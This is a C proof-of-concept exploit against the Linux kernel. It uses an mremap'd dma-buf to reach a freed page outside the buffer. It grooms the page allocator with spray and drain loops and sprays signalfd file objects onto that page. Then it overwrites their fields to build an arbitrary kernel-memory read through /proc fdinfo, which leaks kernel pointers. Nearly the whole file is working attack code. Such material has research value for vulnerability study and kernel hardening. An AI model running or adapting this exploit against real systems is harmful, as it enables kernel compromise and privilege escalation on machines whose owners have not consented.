#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>

#include "dma_buf_t.h"

#include <sys/signalfd.h>
#include <syscall.h>

#define NUM_SPRAY_PAGES (8)
#define PAGE_SIZE 0x1000
#define errx(ret_code, msg) do{perror(msg); exit(ret_code);} while(0);

#define NUM_SPRAYS (20)
#define NUM_SPRAY_BUFS (20)

#define NUM_DRAIN_BUFS (20) //These need to be enough to make sure the page we steal isn't on the pcp_freelist
#define NUM_SCAN_ITERATIONS (1000)

#define NUM_SPRAY_FDS (100) //WRONG sizeof(struct file)=112 -> kmalloc-128 -> we need at least 32+1 sprayed filps to make sure a new page is allocated.
/*
~ # cat /sys/kernel/slab/filp/objs_per_slab
16
~ # cat /sys/kernel/slab/filp/object_size
256
~ # cat /sys/kernel/slab/filp/slab_size
256
~ # cat /sys/kernel/slab/filp/min_partial
5
*/
//To really guarantee a new allocation of a page we need min_partial*(objs_per_slab)+1 so 5*(16)+1 = 81
//But doing more makes it more likely to work so just do 100

#define min(a,b) ((a)<(b)?(a):(b))

dma_buf_t *spray_array[NUM_SPRAY_BUFS] = {0};
int fd_array[NUM_SPRAY_FDS] = {0};

int raw_signalfd(int fd, sigset_t* sigset, size_t sizemask)
{
    int ret = syscall(__NR_signalfd, fd, sigset, sizemask);
    if(ret<0)
        perror("[-]signalfd");
    return ret;
}

void hexdump(char* addr, size_t len)
{
    const size_t line_size=32;
    const size_t group_by = 8;
    size_t off = 0;
    int64_t rem = len;
    printf("hexdump@%p:\n",addr);
    while(rem)
    {
        printf("+0x%04lx:", off);
        for(int l_cnt=0; l_cnt<line_size && rem; l_cnt++,off++,rem--)
        {
            if((l_cnt%group_by)==0)
                printf(" ");
            printf("%02hhx", addr[off]);
        }
        printf("\n");
    }
}

int spray()
{
    for(int i=0; i<NUM_SPRAYS; i++)
    {
        for(int j=0; j<NUM_SPRAY_BUFS; j++)
        {
            spray_array[j] = dma_buf_create(NUM_SPRAY_PAGES*PAGE_SIZE);
        }

        for(int j=0; j<NUM_SPRAY_BUFS; j++)
        {
            close(spray_array[j]->buf_fd);
            free(spray_array[j]);
            spray_array[j] = NULL;
        }
    }
}

int drain()
{
    for(int j=0; j<NUM_DRAIN_BUFS; j++)
    {
        spray_array[j] = dma_buf_create(2*(NUM_SPRAY_PAGES)*PAGE_SIZE);
    }
}

int drain_free()
{
    for(int j=0; j<NUM_DRAIN_BUFS; j++)
    {
        if(spray_array[j])
        {
            close(spray_array[j]->buf_fd);
            free(spray_array[j]);
            spray_array[j] = NULL;
        }
    }
}

static char sigfd_proc_path[128]={0};
static int sigfd_proc_fd = -1;
void* signalfd_ops_ptr = NULL;
uint64_t* privdata_ptr = NULL;

void arb_read_prep(int sigfd)
{
    pid_t pid = getpid();
    snprintf(sigfd_proc_path, 128, "/proc/%d/fdinfo/%d", pid, sigfd);
    sigfd_proc_fd = open(sigfd_proc_path, O_RDONLY);
    privdata_ptr = signalfd_ops_ptr+0xa0;
}

size_t read_sigmask(int procfs_fd)
{
    char buf[512];
    lseek(procfs_fd, 0, SEEK_SET);
    //Read from procfs
    int read_bytes = 0;
    if((read_bytes = read(procfs_fd,buf,sizeof(buf)-1))<=0)
    {
        perror("[-] Failed to read from procfs_fd");
        exit(-1);
    }

    //Gather heap leak from procfs output
    buf[read_bytes] = 0;
    //printf("[+] Procfs: %d read\n%s\n",read_bytes, buf);
    if(read_bytes <= 20)
    {
        printf("[-] Couldn't read sigmask\n");
        printf("[-] Procfs: %d read\n%s\n",read_bytes, buf);
        return 0;
    }
    buf[read_bytes-1] = 0;
    char* hex_str = (buf+read_bytes-16-1);
    size_t hex_val = strtoull(hex_str, NULL, 16);
    return hex_val;
}

uint64_t arb_read(void* src)
{
    uint64_t old_val = *privdata_ptr;
    *privdata_ptr = (uint64_t) src;
    uint64_t read_val = read_sigmask(sigfd_proc_fd);
    *privdata_ptr = old_val;
    return read_val;
}

static inline int matches_signalfd_fops(void* ptr)
{
    return ((uint64_t)ptr&0xfff) == 0xf40;
}

int fd_cleanup()
{
    for(int j=0; j<NUM_SPRAY_FDS; j++)
    {
        close(fd_array[j]);
        fd_array[j] = -1;
    }
}

int main(int argc, char* argv[])
{
    spray();

    printf("[+] draining\n");
    drain();

    printf("[+] creating dma buf\n");
    dma_buf_t *dma_buf = dma_buf_create((NUM_SPRAY_PAGES-1)*PAGE_SIZE);
    if(!dma_buf)
        errx(1, "[-] couldn't create dma buf");
    
    printf("[+] mapping dma buf\n");
    void* addr = mmap(NULL, dma_buf->size,
        PROT_READ|PROT_WRITE, MAP_SHARED, dma_buf->buf_fd, 0);
    if (addr == MAP_FAILED)
        errx(1, "[-] couldn't map memory");

    printf("[+] expanding dma buf by one page\n");
    void* remapped_addr = mremap(addr, dma_buf->size, dma_buf->size+PAGE_SIZE, MREMAP_MAYMOVE);
    if(remapped_addr==MAP_FAILED)
        errx(1, "[-] couldn't mremap memory");

    printf("[+] accessing OOB page\n");
    volatile char* uaf_page = ((volatile char*)remapped_addr+dma_buf->size);
    /*Don't fault in the page unless we are pretty sure it can't be on the pcp_freelist*/
    //char dummy = *uaf_page;
    
    //madvise((void*)uaf_page, PAGE_SIZE, MADV_DONTNEED);

    drain_free();

    printf("[+] Scan loop\n");
    
    int signalfd_found = 0;

    for(int i=0; i<NUM_SCAN_ITERATIONS; i++)
    {

        uint64_t val = 0;
        //Spray signalfds
        for(int j=0; j<NUM_SPRAY_FDS; j++)
            fd_array[j] = raw_signalfd(-1, (sigset_t*)&val, 8);
        //Drain pages on the freelist to make sure we don't run into the issue with having the same page on the freelist twice
        drain();
        
        //Fault in page after we are relatively sure it won't explode later
        //and check if we find the expected ops on it
        for(int j=0; j<PAGE_SIZE/8; j+=1)
        {
            uint64_t* uaf_page_ptrs=(uint64_t*)uaf_page;
            if(matches_signalfd_fops((void*)uaf_page_ptrs[j]))
            {
                signalfd_found = 1;
                printf("[+] Found signalfd filp\n");
                signalfd_ops_ptr = (void*)&uaf_page_ptrs[j];
                hexdump((char*)uaf_page+j*8, min(PAGE_SIZE-j*8,0x200));
                //memset((void*)uaf_page, 0x41, PAGE_SIZE);
                break;
            }
        }
        //If we found something that looks like a signalfd filp we are good.
        if(signalfd_found) break;

        //If we didn't find it we need to clean up for the next loop iteration
        //Return our UAF page first which shouldn't free it because either drain or fds should hold another reference
        madvise((void*)uaf_page, PAGE_SIZE, MADV_DONTNEED);
        //Then free the drain pages
        drain_free();
        //Then free the filps, this way pages should "rotate" around giving us a better shot to hit our UAF page, since that one is fixed.
        fd_cleanup();
    }

    printf("[+] After loop\n");
    if(!signalfd_found)
    {
        //Cleanup already done on loop exit
        exit(-1);
    }

    uint64_t* mode_ptr = signalfd_ops_ptr+24;
    uint64_t old_val = *mode_ptr;
    *mode_ptr = (uint64_t)-1;

    int sigfd_idx = -1;

    for(int j=0; j<NUM_SPRAY_FDS; j++)
    {
        int val = fcntl(fd_array[j], F_GETFL);
        if(val ==-1)
        {
            sigfd_idx = j;
            break;
        }
        //printf("[+] %d: %x\n", j, val);
    }

    printf("[+] signalfd idx=%d\n", sigfd_idx);

    *mode_ptr = old_val;

    if(sigfd_idx<0)
    {
        fd_cleanup();
        exit(-1);
    }

    arb_read_prep(fd_array[sigfd_idx]);
    void* ptr = (void*)*(privdata_ptr+1);
    printf("%p\n", ptr);
    printf("%p\n", (void*)~arb_read(ptr));

    //Do the cleanup we didn't do at the end of our scanning loop to exit cleanly
    madvise((void*)uaf_page, PAGE_SIZE, MADV_DONTNEED);
    fd_cleanup();
    drain_free();

    
    //munmap(remapped_addr, dma_buf->size+PAGE_SIZE);
    //while(1){}
    //hexdump(remapped_addr+dma_buf->size, 0x200);
}